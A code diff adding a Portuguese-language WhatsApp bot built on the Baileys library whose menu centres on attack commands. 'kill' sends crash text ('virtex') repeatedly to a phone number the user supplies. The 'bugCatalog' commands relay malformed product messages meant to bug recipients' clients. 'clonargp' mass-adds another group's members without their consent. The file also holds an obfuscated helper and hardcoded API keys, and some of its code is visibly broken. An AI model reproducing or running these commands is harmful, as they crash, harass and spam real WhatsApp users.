@@ -1,0 +1,4012 @@
+const
+	{
+		WAConnection,
+		MessageType,
+		Presence,
+		MessageOptions,
+		Mimetype,
+		WALocationMessage,
+		WA_MESSAGE_STUB_TYPES,
+		WA_DEFAULT_EPHEMERAL,
+		ReconnectMode,
+		ProxyAgent,
+		GroupSettingChange,
+		waChatKey,
+		mentionedJid,
+		processTime,
+	} = require("@adiwajshing/baileys")
+const fs = require("fs")
+const axre = require('axios')
+const speed = require("performance-now")
+const util = require('util')
+const yts = require('yt-search')
+const crypto = require('crypto')
+const request = require('request')
+const { exec, spawn } = require('child_process')
+const fetch = require('node-fetch')
+const moment = require('moment-timezone')
+const ffmpeg = require('fluent-ffmpeg')
+const { removeBackgroundFromImageFile } = require('remove.bg')
+const { zeks } = require('./database/key')
+const { EmojiAPI } = require("emoji-api")
+const emoji = new EmojiAPI()
+
+
+/* CONST TRAVAS */
+
+const { catalogo } = require('./travas/catalogo.js')
+const { catalogo_des } = require('./travas/catalogo_des.js')
+const { travatxt } = require('./travas/travatxt.js')
+
+
+// VIRTEX \\
+
+const { virtex1 } = require('./virtex/virtex1')
+const { virtex9 } = require('./virtex/virtex9')
+
+//const pra add (prefix) e ligas as pastas das travas :v
+
+//══════════[ Lib ]══════════//
+
+const { pinterest2 } = require('./lib/pinterest2')
+const { pinterest } = require('./lib/pinterest')
+const { fetchJosn, fetchText } = require('./lib/fetcher')
+const { color, bgcolor } = require('./lib/color')
+const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
+const { sleep } = require("./lib/offline");
+const setting = JSON.parse(fs.readFileSync('./setting.json'))
+const { y2mateA, y2mateV } = require('./lib/y2mate')
+const { yta, ytv, upload } = require('./lib/ytdl')
+
+//══════════[ Const ]══════════//
+        const enviar = (teks) => {
+        trick.sendMessage(from, teks, text, {quoted:zztrickkk})}
+        const sendWebp = async(from, url) => {
+                var names = Date.now() / 10000;
+                var download = function (uri, filename, callback) {
+                    request.head(uri, function (err, res, body) {
+                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
+                    });
+                };
+                download(url, './temp' + names + '.png', async function () {
+                    console.log('selesai');
+                    let ajg = './temp' + names + '.png'
+                    let palak = './temp' + names + '.webp'
+                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop-preset default -an -vsync-s 512:512 ${palak}`, (err) => {
+                        let media = fs.readFileSync(palak)
+                        index.sendMessage(from, media, MessageType.sticker,{quoted:mek})
+                        fs.unlinkSync(ajg)
+                        fs.unlinkSync(palak)
+                    });
+                });
+            }            
+//══════════[ Setting ]══════════//
+
+owner = setting.OwnerNumber
+botname = setting.BotName
+ownername = setting.OwnerName
+fake = setting.Fake
+Yt = setting.yt       
+        banChats = true
+
+const fakeimage = fs.readFileSync ('./media/menu.jpg')
+const trickfake = fs.readFileSync ('./media/thumb.jpg')
+const fakethumb = fs.readFileSync('./image/thumbnail.jpg')
+//══════════[ Data Base ]══════════//
+
+const _antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
+const _antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
+const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
+
+//══════════[ Module Export ]══════════//
+		
+module.exports = trick = async (trick, mek, _welkom) => {
+	try {
+        if (!mek.hasNewMessage) return
+        mek = mek.messages.all()[0]
+		if (!mek.message) return
+		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
+		global.blocked
+    	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+        const content = JSON.stringify(mek.message)
+		const from = mek.key.remoteJid
+		const { text, extendedText, contact, contactsArray, groupInviteMessage, listMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType		
+        const type = Object.keys(mek.message)[0]        
+        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
+        const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '#'          	
+        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : ''
+		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
+		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
+		const args = body.trim().split(/ +/).slice(1)
+		const arg = budy.slice(command.length + 2, budy.length)
+		const c = args.join(' ')
+		const isCmd = body.startsWith(prefix)
+		const q = args.join(' ')
+		const Verived = "0@s.whatsapp.net"
+		const txt = mek.message.conversation
+		const botNumber = trick.user.jid
+		const ownerNumber = [`${owner}@s.whatsapp.net`, `5521996941851@s.whatsapp.net`]
+		const isGroup = from.endsWith('@g.us')
+		let sender = isGroup ? mek.participant : mek.key.remoteJid
+		let senderr = mek.key.fromMe ? trick.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
+		const groupMetadata = isGroup ? await trick.groupMetadata(from) : ''
+		const groupName = isGroup ? groupMetadata.subject : ''
+		const groupId = isGroup ? groupMetadata.jid : ''
+		const groupMembers = isGroup ? groupMetadata.participants : ''
+		const groupDesc = isGroup ? groupMetadata.desc : ''
+		const groupOwner = isGroup ? groupMetadata.owner : ''
+		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
+		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
+		const isGroupAdmins = groupAdmins.includes(sender) || false
+		const isNsfw = isGroup ? nsfww.includes(from) : false
+        const senderNumber = sender.split("@")[0]
+        const hour_now = moment().format('HH:mm:ss')
+		const conts = mek.key.fromMe ? trick.user.jid : trick.contacts[sender] || { notify: jid.replace(/@.+/, '') }
+        const pushname = mek.key.fromMe ? trick.user.name : conts.notify || conts.vname || conts.name || '-'    
+    
+		const isAntiLink = isGroup ? _antilink.includes(from) : false
+		const isWelkom = isGroup ? _welkom.includes(from) : false
+		const isAntiVirtex = isGroup ? _antivirtex.includes(from) : false
+		const isOwner = ownerNumber.includes(sender)
+		const isMybot = isOwner || mek.key.fromMe
+		let bio_nya = await trick.getStatus(sender)
+		try {
+			bio_user = `${bio_nya.status}`
+		} catch {
+			bio_user = '-'
+			}
+			
+//══════════[ Button ]══════════//
+
+const apil = ['KurrXd','78bd89cd7b4d6205e3e18061','7c6c9a9e1138b473e6c64388','KurrXd','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','KurrXd','8cd8a7918eab2510afd496c0']
+
+ const loll = apil[Math.floor(Math.random() * apil.length)]
+
+multi = true
+
+	    if (multi){
+		    var lolh = [`${loll}`]
+        } 
+  
+        
+        
+
+  const sendButton = async (from, context, fortext, but, mek) => {
+            buttonMessages = {
+                contentText: context,
+                footerText: fortext,
+                buttons: but,
+                headerType: 1
+            }
+            trick.sendMessage(from, buttonMessages, buttonsMessage, {
+                quoted: ftrol
+            })
+        }
+        
+        const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
+      const buttonMessage = {
+        contentText: text1,
+        footerText: desc1,
+        buttons: but,
+        headerType: 1,
+      };
+      trick.sendMessage(
+        id,
+        buttonMessage,
+        MessageType.buttonsMessage,
+        options
+       );
+       };
+       
+        const sendButImage = async (from, context, fortext, img, but, mek) => {
+            jadinya = await trick.prepareMessage(from, img, image)
+            buttonMessagesI = {
+                imageMessage: jadinya.message.imageMessage,
+                contentText: context,
+                footerText: fortext,
+                buttons: but,
+                headerType: 4
+            }
+            trick.sendMessage(from, buttonMessagesI, buttonsMessage, {
+                quoted: ftrol,
+            })
+        }
+        async function sendButLocation(id, text1, desc1, gam1, but = [], options = {}) {
+            const buttonMessages = { locationMessage: { jpegThumbnail: gam1 }, contentText: text1, footerText: desc1, buttons: but, headerType: 6 }
+            return trick.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
+        }
+
+const sendButDocument = async(id, text1, desc1, media, doc1, but = [], options = {}) => {
+kma = doc1
+mhan = await trick.prepareMessage(from, media, document, kma)
+const buttonMessages = {
+documentMessage: mhan.message.documentMessage,
+contentText: text1,
+footerText: desc1,
+buttons: but,
+headerType: "DOCUMENT"
+}
+trick.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
+}
+
+const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
+kma = vid1
+mhan = await trick.prepareMessage(from, kma, video)
+const buttonMessages = {
+videoMessage: mhan.message.videoMessage,
+contentText: text1,
+footerText: desc1,
+buttons: but,
+headerType: 5
+}
+trick.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
+}
+			
+//━━━━━━━━━━━━━━━[ APIKEY ]━━━━━━━━━━━━━━━━━//
+
+//
+mess = {
+wait: ' Processando....',
+eror: 'Desculpe, ocorreu um erro !!',
+success: '✅️',
+error: {
+stick: 'desculpe não é figurinha !!',
+Iv: ' Link inválido'
+},
+only: {
+group: 'Esta função só está disponível em grupos',
+owner: 'disponível apenas para proprietários',
+admin: 'disponível apenas para administradores do grupo',
+Badmin: 'faça admin se você quiser usar esse recurso !!'
+}
+} 
+        faketeks = '© Trick Copyright' 
+		const isUrl = (url) => {
+        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
+        }
+        const reply = (teks) => {
+            trick.sendMessage(from, teks, text, {quoted:mek})
+        }
+        const sendMess = (hehe, teks) => {
+            trick.sendMessage(hehe, teks, text)
+        }
+        const mentions = (teks, memberr, id) => {
+            (id == null || id == undefined || id == false) ? trick.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : trick.sendMessage(from, teks.trim(), extendedText, { quoted: zztrickkk, contextInfo: { "mentionedJid": memberr } })
+        }
+        const costum = (pesan, tipe, target, target2) => {
+			trick.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
+		}
+        
+//******************** 》Apikey《 ********************\\
+
+const sendButton5 = async (id, text1, desc1, yo) => {
+// by trick
+var buatpesan = await trick.prepareMessage(from, {
+    "templateMessage": {
+      "hydratedTemplate": {
+        ...yo.message,
+        "hydratedContentText": text1,
+        "hydratedFooterText": desc1,
+        "hydratedButtons": [
+          {
+            "urlButton": {
+              "displayText": "Github Owner",
+              "url": "https://github.com/trickzin"
+            }
+          },
+          {
+            "callButton": {
+              "displayText": "Call Owner",
+              "phoneNumber": "5521996941851"
+            }
+          },          
+          {
+            "quickReplyButton": {
+              "displayText": "Owner",
+              "id": `${prefix}owner`
+            }
+          }
+        ]
+      }
+    }
+  }, {})
+trick.sendMessage(id, buatpesan.message, { messageId: buatpesan.key.id })
+}
+           
+
+//══════════[ Fake ]══════════//
+
+(function(_0x1b8915,_0x57a6bf){const _0x412a16=_0x2b09,_0x122aa7=_0x1b8915();while(!![]){try{const _0x20e0de=-parseInt(_0x412a16(0x1ee))/0x1+parseInt(_0x412a16(0x1f2))/0x2+-parseInt(_0x412a16(0x1ed))/0x3+parseInt(_0x412a16(0x1ea))/0x4+parseInt(_0x412a16(0x1f3))/0x5*(-parseInt(_0x412a16(0x1e9))/0x6)+parseInt(_0x412a16(0x1e8))/0x7*(-parseInt(_0x412a16(0x1ef))/0x8)+parseInt(_0x412a16(0x1ec))/0x9*(parseInt(_0x412a16(0x1eb))/0xa);if(_0x20e0de===_0x57a6bf)break;else _0x122aa7['push'](_0x122aa7['shift']());}catch(_0x2c65a0){_0x122aa7['push'](_0x122aa7['shift']());}}}(_0x4ba3,0xccdb9));function _0x4ba3(){const _0x1a8e93=['1955ZVqozT','Vai\x20La\x20trickkk','3934jqJVjq','3606qsWnmD','4756988iNrMmE','10CjixGd','12275199dSoNvX','1429758sTvhoJ','1337935mmuKuU','7968ZGgjmP','sendMessage','https://telegra.ph/file/64a3f4a3ea76ee25e201a.jpg','1790406UzTXHm'];_0x4ba3=function(){return _0x1a8e93;};return _0x4ba3();}function _0x2b09(_0x355e2e,_0x45886d){const _0x4ba36f=_0x4ba3();return _0x2b09=function(_0x2b099b,_0x2e8bfd){_0x2b099b=_0x2b099b-0x1e8;let _0x1f5df4=_0x4ba36f[_0x2b099b];return _0x1f5df4;},_0x2b09(_0x355e2e,_0x45886d);}const fakeyt=_0x476008=>{const _0x5afc32=_0x2b09;trick[_0x5afc32(0x1f0)](from,_0x476008,text,{'contextInfo':{'text':'hi','forwardingScore':0x3b9aca00,'isForwarded':![],'sendEphemeral':![],'externalAdReply':{'title':''+pushname,'body':_0x5afc32(0x1f4),'mediaType':'10','mediaUrl':''+Yt,'thumbnailUrl':_0x5afc32(0x1f1),'thumbnail':fakeimage,'sourceUrl':''+Yt},'mentionedJid':[sender]},'quoted':mek});};
+
+        const fakestatus = (teks) => {
+            trick.sendMessage(from, teks, text, {
+                quoted: {
+                    key: {
+                        fromMe: false,
+                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
+                    },
+                    message: {
+                        "imageMessage": {
+                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
+                            "mimetype": "image/jpeg",
+                            "caption": fake,
+                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
+                            "fileLength": "28777",
+                            "height": 1080,
+                            "width": 1079,
+                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
+                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
+                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
+                            "mediaKeyTimestamp": "1610993486",
+                            "jpegThumbnail": fs.readFileSync('./media/menu.jpg'),
+                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
+                        }
+                    }
+                }
+            })
+        }
+        
+        const fakegroup = (teks) => {
+            trick.sendMessage(from, teks, text, {
+                quoted: {
+                    key: {
+                        fromMe: false,
+                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
+                    },
+                    message: {
+                        "imageMessage": {
+                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
+                            "mimetype": "image/jpeg",
+                            "caption": fake,
+                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
+                            "fileLength": "28777",
+                            "height": 1080,
+                            "width": 1079,
+                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
+                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
+                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
+                            "mediaKeyTimestamp": "1610993486",
+                            "jpegThumbnail": fs.readFileSync('./media/menu.jpg'),
+                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
+                        }
+                    }
+                }
+            })
+        }
+        
+const trickkx = {
+	 key: { 
+          fromMe: false,
+	      participant: `0@s.whatsapp.net`, ...(from ? 
+	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
+                },
+	 message: { 
+                 "videoMessage": { 
+                 "title": `Trick  {₪}`,
+                 "h": `${pushname}`,
+                 'duration': '99999', 
+                 'caption': `${pushname}`,
+                        }
+                       }
+	                  }
+                   
+        const zztrickkk = {
+	key : {
+                          participant : '0@s.whatsapp.net'
+                        },
+       message: {
+                    orderMessage: {
+                            itemCount : 99999999,
+                            status: 1,
+                            surface : 1,
+                            message: `${pushname}`, 
+                            orderTitle: `${botname}`,
+                            thumbnail: trickfake,
+                            sellerJid: '0@s.whatsapp.net' 
+                          }
+                        }
+                      }
+        
+//══════════[ Storage ]══════════//
+
+        const sendStickerFromUrl = async(to, url) => {
+                var names = Date.now() / 10000;
+                var q = args.join(' ')
+                var apikey5 = config.Zero
+                var yts = require('yt-search')
+                var download = function (uri, filename, callback) {
+                    request.head(uri, function (err, res, body) {
+                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
+                    });
+                };
+                download(url, './stik' + names + '.png', async function () {
+                    console.log('selesai');
+                    let filess = './stik' + names + '.png'
+                    let asw = './stik' + names + '.webp'
+                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop-preset default -an -vsync-s 512:512 ${asw}`, (err) => {
+                        let media = fs.readFileSync(asw)
+                        trick.sendMessage(to, media, MessageType.sticker,{quoted:mek})
+                        fs.unlinkSync(filess)
+                        fs.unlinkSync(asw)
+                    });
+                });
+            }
+            const sendFileFromUrl = async(link, type, options) => {
+           hasil = await getBuffer(link)
+	       trick.sendMessage(from, hasil, type, options).catch(e => {
+	       fetch(link).then((hasil) => {
+	       trick.sendMessage(from, hasil, type, options).catch(e => {
+	       trick.sendMessage(from, { url : link }, type, options).catch(e => {
+	       reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
+	       console.log(e)
+            })
+           })
+          })
+         })
+        }
+        const sendMediaURL = async(to, url, text="", mids=[]) =>{
+                if(mids.length > 0){
+                    text = normalizeMention(to, text, mids)
+                }
+                const fn = Date.now() / 10000;
+                const filename = fn.toString()
+                let mime = ""
+                var download = function (uri, filename, callback) {
+                    request.head(uri, function (err, res, body) {
+                        mime = res.headers['content-type']
+                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
+                    });
+                };
+                download(url, filename, async function () {
+                    console.log('done');
+                    let media = fs.readFileSync(filename)
+                    let type = mime.split("/")[0]+"Message"
+                    if(mime === "image/gif"){
+                        type = MessageType.video
+                        mime = Mimetype.gif
+                    }
+                    if(mime.split("/")[0] === "audio"){
+                        mime = Mimetype.mp4Audio
+                    }
+                    trick.sendMessage(to, media, type, { quoted: zztrickkk, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
+                    
+                    fs.unlinkSync(filename)
+                });
+            }  
+
+/* COLORS */
+
+		colors = ['red', 'white', 'trick', 'blue', 'yellow', 'green']
+		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
+		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
+		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
+		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
+		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
+      	if (!isGroup && isCmd) console.log('\x1b[1;31m[ PC\x1b[1;37m ]', '[\x1b[1;32m PRIBADI \x1b[1;37m]', color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
+      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
+     	if (isCmd && isGroup) console.log('\x1b[1;31m[ GC\x1b[1;37m ]', '[\x1b[1;32m GROUP \x1b[1;37m]', color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
+      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
+switch (command) {
+
+/* MENU */
+
+
+case 'menu':
+ if (!banChats === false && !mek.key.fromMe) return
+ft = fs.readFileSync('./media/menu.jpg')
+sound = fs.readFileSync('menu.mp3')
+menu = `
+┏━━ ༼💎༽๖ۣۣۜ𝐆𝐥𝐨𝐫𝐢𝐨𝐮𝐬 𝐁𝐨𝐭࿆ 1.0༼💎༽ ━━┓
+┃ 🗽 𐎟 .catalogo
+┃ 🔒 𐎟 .spamblock
+┃ 💎 𐎟 .nuke
+┃ 💯 𐎟 .travatxt
+┃ 🛒 𐎟 .kill
+┃ 🕸 𐎟 .temporarity
+┃ 🪐 𐎟 .carrinho
+┃ ☕ 𐎟 .idgroup
+┃ 🌟 𐎟 .bugCatalog
+┃ 📌 𐎟 .bugcatalog1
+┃ 🩸 𐎟 .clonargp
+┣━➖
+┃⚫ • Texzinlock - Coder
+┃⚫ • Trick - Ajudou No bot
+┃⚫ • itzinn - Motivador
+┗━━  ༼💎༽๖ۣۣۜ𝐆𝐥𝐨𝐫𝐢𝐨𝐮𝐬 𝐁𝐨𝐭࿆ 1.0༼💎༽ ━━┛
+`
+trick.sendMessage(from,ft,image,{quoted:zztrickkk,mek,thumbnail:null,caption:menu})
+trick.sendMessage(from, sound, MessageType.audio, {quoted: zztrickkk, mimetype: 'audio/mp4', ptt:true})
+break
+									
+      case 'publico':
+          if (!mek.key.fromMe && !isOwner) return
+          uptime = process.uptime()
+          banChats = false
+          reply(`Modo Publico on`)
+          break
+      case 'privado':
+           if (!mek.key.fromMe && !isOwner) return
+           if (banChats === true) return
+           uptime = process.uptime()
+           banChats = true
+           reply(`Modo privado on`)
+           break
+
+/* CASES DE TRAVAS */ 
+
+case 'clonegroup': 
+case 'clonargrupo':
+case 'clonargp':
+if (args.length == 0) return enviar(`\n\nPor Favor Insira o Id Do Que Queira Clonar Nesse Formato :\n\n - .clonegroup Id do grupo@g.us ... \n           Caso Não Saiba O Id Do Grupo Digite " .idgroup " :)\n\n`)
+
+if (!isGroup) return
+
+id = args.join(' ')
+
+if (!id) return
+
+await trick.groupUpdateSubject(from, `OWNED BY TEX`)
+
+await trick.groupUpdateDescription(from, `\n🐙GROUP CLONED BY TEX🐙\n- https://youtube.com/channel/UCmvWSHuSYLpfkMiJTOFlMfA`) 
+members_id = []
+if (fds.jid === trick.user.from) continue
+members_id.push(fds.jid)
+trick.groupAdd(from, [fds.jid])
+}
+break
+
+case 'idgroup':
+case 'idgp':
+case 'idgrupo':
+reply (from)
+break
+
+case'bugCatalog':
+trick.toggleDisappearingMessages(from, 0)
+if(menuall == false){
+   //baka
+anu = trick.prepareMessageFromContent(from,{
+					"productMessage": {
+						"product": {
+							"productImage": {
+								"url": "https://mmg.whatsapp.net/d/f/AkZ8d19O4Z680SMbfTYSp6K-FbV1iP4MyRyGpAetkqAy.enc",
+						"mimetype": "image/jpeg",
+						"fileSha256": "HZ7GZtD+MZleBjG1flbeTuZkDThPV6frfERXi4zTBvs=",
+						"fileLength": "66214",
+						"height": 999,
+						"width": 999,
+								"mediaKey": "3ucdrq0UyCuNG5YcUD9aKX4qkuvcip+OonjhACusy5Q=",
+						"fileEncSha256": "ifE4O/SNQnPWVe8ya6QZlshnaqIDLcvWFJT4RQ4Bbvk=",
+						"jpegThumbnail": fs.readFileSync("./image/thumb.jpeg")
+                                },
+                            "productId": "9999999",
+							"title": `${virtex9(prefix)}`,
+                            "titleCount": "999",                                                             "description": `${virtex9(prefix)}`,
+							"descriptionCount": "999999",
+							"productImageCount": 999999
+						},
+						"businessOwnerJid": `0@s.whatsapp.net`,
+						"contextInfo": {
+							"forwardingScore": 10000,
+							"isForwarded": true
+						}
+					}
+				},{quoted: ftroli, contextInfo: { mentionedJid: [sender]}})
+                  trick.relayWAMessage(anu)
+                  } 
+                  break
+
+case 'kill': // 
+if (args.length < 1) return enviar('\n\nPor favor insira o Numero Do Alvo Que Deseja Matar Nesse Formato:\n\n\n\n.kill 5512981791399\n\n\nnumero todo junto sem "-", "(", ")", "+", e "\n\n')
+num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
+sendMess(`${num}`,`${virtex1(prefix)}`,)
+sendMess(`${num}`,`${virtex1(prefix)}`,)
+sendMess(`${num}`,`${virtex1(prefix)}`,)
+break
+
+case 'bugcatalog1':
+ trick.toggleDisappearingMessages(from,)
+ img = fs.readFileSync(`./media/fake.jpeg`)
+ imeu = await trick.prepareMessage('0@s.whatsapp.net', img, image)
+
+imeg = imeu.message.imageMessage
+res = await trick.prepareMessageFromContent(from,{
+  "productMessage": {
+  "product": {
+  "productImage": imeg,
+  "productId": "", 
+  "title": "TEXZINLOCK",
+"description": "texzinlock", // tem q adaptar ok 
+"priceAmount1000": "99999999",
+"descriptionCount": "999999999",
+  "productImageCount": "1",
+  },
+  "businessOwnerJid": "6283805473872@s.whatsapp.net",
+  "contextInfo": {
+  "forwardingScore": 9999,
+  "isForwarded": true
+  }
+  }
+  }, {quoted: {
+				  key: {
+				   fromMe: false,
+				   participant: `0@s.whatsapp.net`, // fake jid
+				   remoteJid: "status@broadcast"
+				  },
+				  message: {
+				   orderMessage: {
+				    itemCount: 999999999, //count item
+				    status: 1,
+				    surface: 1,
+				    message: '999999999',
+				    orderTitle: '999999999', // titlo da carrinho na quated
+				    sellerJid: `0@s.whatsapp.net` // jid do vendedor
+				   }
+				  }
+				 }
+				})
+  trick.relayWAMessage(res)
+  trick.toggleDisappearingMessages(from)
+  break	          
+  
+// ft com quated order tem q adaptar
+
+case 'grupo':
+if(!isBotGroupAdmins) return enviar('Nao Sou Admin')
+if(!isGroupAdmins) return enviar ('So Para Admins')
+if(args[0] == 'abrir') {
+trick.groupSettingChange(from, GroupSettingChange.messageSend,false)
+enviar('GRUPO ABERTO COM SUCESSO!!')
+} else if(args[0] == 'fechar') {
+trick.groupSettingChange(from, GroupSettingChange.messageSend,true)
+enviar('GRUPO FECHADO COM SUCESSO!!')
+}
+break
+
+case 'clonegroup': //case by thz x dvmaker, deixe os créditos ao usar, se editar isto e colocar seu nome nesse tipo "by seu nome" ou qualquer outra coisa, você levara strike! Aviso dado ;)
+
+if (!isGroup) return
+
+id = args.join(' ')
+
+if (!id) return
+
+const oxi = isGroup ? await trick.groupMetadata(`${id}`): ''
+
+const pessoas = isGroup ? oxi.participants: ''
+
+const nomegp = isGroup ? oxi.subject: ''
+
+const descgp = isGroup ? oxi.desc: ''
+
+trick.groupUpdateSubject(from, `${nomegp}`)
+
+trick.groupUpdateDescription(from, `${descgp}`)
+
+for (let fds of pessoas) {
+members_id = []
+if (fds.jid === trick.user.jid) continue
+members_id.push(fds.jid)
+trick.groupAdd(from, [fds.jid])
+}
+break
+
+case 'subir': // Subir o chat - Clear
+if (!isGroupAdmins) return enviar ('🖐️só quem tem pau grande pode usar esse comando !')
+trick.sendMessage(from, '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n', MessageType.text)
+trick.sendMessage(from, '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n', MessageType.text)
